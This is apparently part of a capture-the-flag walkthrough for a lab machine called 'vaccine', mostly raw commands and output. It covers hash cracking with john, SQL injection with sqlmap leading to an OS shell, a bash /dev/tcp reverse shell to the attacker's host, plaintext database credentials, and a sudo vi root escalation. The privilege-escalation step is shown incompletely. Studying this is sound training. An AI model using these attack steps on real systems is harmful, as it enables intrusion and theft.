@@ -4318,3 +4318,503 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+
+```
+Archive:  backup.zip
+[backup.zip] index.php password: 
+  inflating: index.php               
+  inflating: style.css               
+                        
+```
+
+```
+cat index.php 
+<!DOCTYPE html>
+<?php
+session_start();
+  if(isset($_POST['username']) && isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+      $_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+    }
+  }
+?>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>MegaCorp Login</title>
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">
+
+</head>
+  <h1 align=center>MegaCorp Login</h1>
+<body>
+<!-- partial:index.partial.html -->
+<body class="align">
+
+  <div class="grid">
+
+    <form action="" method="POST" class="form login">
+
+      <div class="form__field">
+        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
+        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
+      </div>
+
+      <div class="form__field">
+        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
+        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
+      </div>
+
+      <div class="form__field">
+        <input type="submit" value="Sign In">
+      </div>
+
+    </form>
+
+
+  </div>
+
+  <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>
+
+</body>
+<!-- partial -->
+  
+</body>
+</html>
+```
+
+```
+USERNAME: admin
+PASSWORD: 2cb42f8734ea607eefed3b70af13bbd3 (MD5)
+```
+
+```
+└─$ echo 2cb42f8734ea607eefed3b70af13bbd3 > admin.txt
+
+└─$ john -w=/usr/share/wordlists/rockyou.txt admin.txt --format=raw-md5    
+    
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+qwerty789        (?)     
+1g 0:00:00:00 DONE (2022-07-30 18:39) 100.0g/s 10022Kp/s 10022Kc/s 10022KC/s roslin..pogimo
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+
+```
+![Screenshot_2022-07-30_19_21_34](https://user-images.githubusercontent.com/59018247/182003349-36a91b6e-ad5c-4cc8-aa31-38e11f2f9a24.png)
+
+```
+└─$ sqlmap -u 'http://10.129.187.99/dashboard.php?search=any+query' --cookie="PHPSESSID=2o765usoa104mdu0dkdc5h5rjh"
+        ___
+       __H__                                                                                                                                                     
+ ___ ___["]_____ ___ ___  {1.6.6#stable}                                                                                                                         
+|_ -| . ["]     | .'| . |                                                                                                                                        
+|___|_  ["]_|_|_|__,|  _|                                                                                                                                        
+      |_|V...       |_|   https://sqlmap.org                                                                                                                     
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:37:52 /2022-07-30/
+
+[19:37:52] [INFO] testing connection to the target URL
+[19:37:52] [INFO] testing if the target URL content is stable
+[19:37:52] [INFO] target URL content is stable
+[19:37:52] [INFO] testing if GET parameter 'search' is dynamic
+[19:37:53] [WARNING] GET parameter 'search' does not appear to be dynamic
+[19:37:53] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
+[19:37:53] [INFO] testing for SQL injection on GET parameter 'search'
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] y
+[19:38:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:38:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[19:38:16] [INFO] testing 'Generic inline queries'
+[19:38:16] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[19:38:18] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
+[19:38:18] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[19:38:18] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
+[19:38:18] [INFO] testing 'PostgreSQL inline queries'
+[19:38:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[19:38:18] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)                                                           
+[19:38:30] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
+[19:38:30] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[19:38:41] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
+[19:38:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=any query' AND (SELECT (CASE WHEN (9821=9821) THEN NULL ELSE CAST((CHR(113)||CHR(97)||CHR(109)||CHR(120)) AS NUMERIC) END)) IS NULL-- kOWK
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=any query' AND 9734=CAST((CHR(113)||CHR(122)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9734=9734) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- xiVl
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=any query';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=any query' AND 8587=(SELECT 8587 FROM PG_SLEEP(5))-- vMMM
+---
+[19:39:16] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[19:39:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.187.99'
+
+[*] ending @ 19:39:17 /2022-07-30/
+
+```
+```
+└─$ sqlmap -u 'http://10.129.187.99/dashboard.php?search=any+query' --cookie="PHPSESSID=2o765usoa104mdu0dkdc5h5rjh"
+        ___
+       __H__                                                                                                                                                     
+ ___ ___["]_____ ___ ___  {1.6.6#stable}                                                                                                                         
+|_ -| . ["]     | .'| . |                                                                                                                                        
+|___|_  ["]_|_|_|__,|  _|                                                                                                                                        
+      |_|V...       |_|   https://sqlmap.org                                                                                                                     
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:37:52 /2022-07-30/
+
+[19:37:52] [INFO] testing connection to the target URL
+[19:37:52] [INFO] testing if the target URL content is stable
+[19:37:52] [INFO] target URL content is stable
+[19:37:52] [INFO] testing if GET parameter 'search' is dynamic
+[19:37:53] [WARNING] GET parameter 'search' does not appear to be dynamic
+[19:37:53] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
+[19:37:53] [INFO] testing for SQL injection on GET parameter 'search'
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] y
+[19:38:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:38:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[19:38:16] [INFO] testing 'Generic inline queries'
+[19:38:16] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[19:38:18] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
+[19:38:18] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[19:38:18] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
+[19:38:18] [INFO] testing 'PostgreSQL inline queries'
+[19:38:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[19:38:18] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)                                                           
+[19:38:30] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
+[19:38:30] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[19:38:41] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
+[19:38:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=any query' AND (SELECT (CASE WHEN (9821=9821) THEN NULL ELSE CAST((CHR(113)||CHR(97)||CHR(109)||CHR(120)) AS NUMERIC) END)) IS NULL-- kOWK
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=any query' AND 9734=CAST((CHR(113)||CHR(122)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9734=9734) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- xiVl
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=any query';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=any query' AND 8587=(SELECT 8587 FROM PG_SLEEP(5))-- vMMM
+---
+[19:39:16] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[19:39:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.187.99'
+
+[*] ending @ 19:39:17 /2022-07-30/
+
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u 'http://10.129.187.99/dashboard.php?search=any+query' --cookie="PHPSESSID=2o765usoa104mdu0dkdc5h5rjh" --os-shell
+        ___
+       __H__                                                                                                                                                     
+ ___ ___[']_____ ___ ___  {1.6.6#stable}                                                                                                                         
+|_ -| . [,]     | .'| . |                                                                                                                                        
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                        
+      |_|V...       |_|   https://sqlmap.org                                                                                                                     
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:42:02 /2022-07-30/
+
+[19:42:02] [INFO] resuming back-end DBMS 'postgresql' 
+[19:42:02] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=any query' AND (SELECT (CASE WHEN (9821=9821) THEN NULL ELSE CAST((CHR(113)||CHR(97)||CHR(109)||CHR(120)) AS NUMERIC) END)) IS NULL-- kOWK
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=any query' AND 9734=CAST((CHR(113)||CHR(122)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9734=9734) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- xiVl
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=any query';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=any query' AND 8587=(SELECT 8587 FROM PG_SLEEP(5))-- vMMM
+---
+[19:42:02] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[19:42:02] [INFO] fingerprinting the back-end DBMS operating system
+[19:42:03] [INFO] the back-end DBMS operating system is Linux
+[19:42:04] [INFO] testing if current user is DBA
+[19:42:05] [INFO] retrieved: '1'
+[19:42:05] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
+[19:42:05] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> 
+```
+
+```
+└─$ sudo nc -lvnp 443                                      
+[sudo] password for kali: 
+listening on [any] 443 ...
+```
+
+```
+os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.37/443 0>&1"
+do you want to retrieve the command standard output? [Y/n/a] y
+[19:45:48] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+```
+
+```
+connect to [10.10.16.37] from (UNKNOWN) [10.129.187.99] 44046
+bash: cannot set terminal process group (4176): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ 
+```
+```
+postgres@vaccine:/var/lib/postgresql$ cat user.txt
+cat user.txt
+ec9b13ca4d6229cd5cc1e09980965bf7
+postgres@vaccine:/var/lib/postgresql$ 
+```
+```
+postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
+cd /var/www/html
+postgres@vaccine:/var/www/html$ ls
+ls
+bg.png
+dashboard.css
+dashboard.js
+dashboard.php
+index.php
+license.txt
+style.css
+postgres@vaccine:/var/www/html$ exit
+                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.16.37] from (UNKNOWN) [10.129.187.99] 44446
+bash: cannot set terminal process group (4774): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
+cd /var/www/html
+postgres@vaccine:/var/www/html$ ls
+ls
+bg.png
+dashboard.css
+dashboard.js
+dashboard.php
+index.php
+license.txt
+style.css
+postgres@vaccine:/var/www/html$ cat dashbboard.php
+cat dashbboard.php
+cat: dashbboard.php: No such file or directory
+postgres@vaccine:/var/www/html$ cat dashboard.php
+cat dashboard.php
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="./dashboard.css">
+  <script src="https://use.fontawesome.com/33a3739634.js"></script>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<body>
+ <div id="wrapper">
+ <div class="parent">
+  <h1 align="left">MegaCorp Car Catalogue</h1>
+<form action="" method="GET">
+<div class="search-box">
+  <input type="search" name="search" placeholder="Search" />
+  <button type="submit" class="search-btn"><i class="fa fa-search"></i></button>
+</div>
+</form>
+  </div>
+  
+  <table id="keywords" cellspacing="0" cellpadding="0">
+    <thead>
+      <tr>
+        <th><span style="color: white">Name</span></th>
+        <th><span style="color: white">Type</span></th>
+        <th><span style="color: white">Fuel</span></th>
+        <th><span style="color: white">Engine</span></th>
+      </tr>
+    </thead>
+    <tbody>
+        <?php
+        session_start();
+        if($_SESSION['login'] !== "true") {
+          header("Location: index.php");
+          die();
+        }
+        try {
+          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+        }
+
+        catch ( exception $e ) {
+          echo $e->getMessage();
+        }
+
+        if(isset($_REQUEST['search'])) {
+
+          $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
+
+          $result = pg_query($conn,$q);
+
+          if (!$result)
+          {
+                            die(pg_last_error($conn));
+          }
+          while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
+              {
+                echo "
+                  <tr>
+                    <td class='lalign'>$row[1]</td>
+                    <td>$row[2]</td>
+                    <td>$row[3]</td>
+                    <td>$row[4]</td>
+                  </tr>";
+            }
+        }
+        else {
+
+          $q = "Select * from cars";
+
+          $result = pg_query($conn,$q);
+
+          if (!$result)
+          {
+                            die(pg_last_error($conn));
+          }
+          while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
+              {
+                echo "
+                  <tr>
+                    <td class='lalign'>$row[1]</td>
+                    <td>$row[2]</td>
+                    <td>$row[3]</td>
+                    <td>$row[4]</td>
+                  </tr>";
+            }
+        }
+
+
+      ?>
+    </tbody>
+  </table>
+ </div> 
+</body>
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script  src="./dashboard.js"></script>
+
+</body>
+</html>
+```
+
+```
+"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!")
+```
+```
+└─$ ssh postgres@10.129.187.99
+The authenticity of host '10.129.187.99 (10.129.187.99)' can't be established.
+ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '10.129.187.99' (ED25519) to the list of known hosts.
+postgres@10.129.187.99's password: 
+Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 31 Jul 2022 12:12:02 AM UTC
+
+  System load:  0.0               Processes:             187
+  Usage of /:   32.6% of 8.73GB   Users logged in:       0
+  Memory usage: 20%               IP address for ens160: 10.129.187.99
+  Swap usage:   0%
+
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+postgres@vaccine:~$ 
+```
+```
+postgres@vaccine:~$ sudo -l
+[sudo] password for postgres: 
+Matching Defaults entries for postgres on vaccine:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+postgres@vaccine:~$ 
+```
+```
+postgres@vaccine:~$ sudo /bin/vi
+Sorry, user postgres is not allowed to execute '/bin/vi' as root on vaccine.
+postgres@vaccine:~$ /etc/postgresql/11/main/pg_hba.conf
+```
+```
+# whoami 
+root
+# 
+```
+```
+# cd
+# ls
+pg_hba.conf  root.txt  snap
+# cat root.txt
+dd6e058e814260bc70e9bbdef2715849
+# 
+```
